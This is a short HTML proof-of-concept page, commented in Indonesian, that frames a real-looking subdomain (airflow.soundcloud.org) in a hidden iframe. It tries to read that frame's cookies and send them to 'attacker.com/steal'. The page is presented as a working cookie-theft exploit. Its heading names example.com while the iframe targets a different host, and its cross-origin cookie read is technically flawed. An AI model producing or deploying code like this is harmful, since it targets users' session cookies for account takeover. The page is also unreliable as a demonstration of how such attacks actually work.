<!DOCTYPE html>
<html>
<head>
    <title>POC - Ambil Cookie</title>
</head>
<body>
    <h1>POC - Ambil Cookie dari example.com</h1>
    <iframe id="targetFrame" src="https://airflow.soundcloud.org" style="display:none;"></iframe>
    <script>
        // Tunggu hingga iframe dimuat
        document.getElementById('targetFrame').onload = function() {
            try {
                // Akses cookie dari iframe
                var cookies = document.getElementById('targetFrame').contentWindow.document.cookie;

                // Kirim cookie ke server penyerang
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://attacker.com/steal?cookies=" + encodeURIComponent(cookies), true);
                xhr.send();
            } catch (e) {
                console.log("Gagal mengambil cookie:", e);
            }
        };
    </script>
</body>
</html>
